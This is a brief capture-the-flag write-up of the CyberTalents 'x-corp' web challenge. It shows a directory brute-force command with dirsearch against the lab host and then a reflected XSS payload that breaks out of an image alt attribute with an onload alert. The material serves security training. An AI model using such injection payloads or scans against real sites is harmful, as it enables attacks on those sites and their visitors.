# Solve x-corp
#### https://cybertalents.com/challenges/web/x-corp

![alt text](image.png)
### Run Directory bruteforce
`dirsearch -u http://wcamxwl32pue3e6mgjk319pirvmej6zqdkgxu639-web.cybertalentslabs.com -x 403,404`

Nothing found 

### Try to cause error in the app

![alt text](image-1.png)

The parameter is reflected in the image alt 

### Try xss payload
`wcamxwl32pue3e6mgjk319pirvmej6zqdkgxu639-web.cybertalentslabs.com/?name=' onload=alert('m_1337')`
![alt text](image-2.png)

>Find More on ==> github.com/MedhatHassan 
